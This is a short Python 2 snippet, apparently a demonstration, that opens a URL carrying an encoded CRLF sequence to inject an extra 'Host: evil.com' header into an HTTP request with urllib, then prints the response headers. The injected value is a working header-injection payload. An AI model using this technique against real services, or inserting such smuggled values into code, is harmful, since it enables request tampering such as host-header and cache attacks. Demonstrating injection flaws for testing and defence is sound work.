# Import the urllib module
import urllib

# Open a malicious URL with a CRLF injection
response = urllib.urlopen('http://example.com/?a=1%0D%0AHost:%20evil.com')

# Print the response headers
print(response.headers)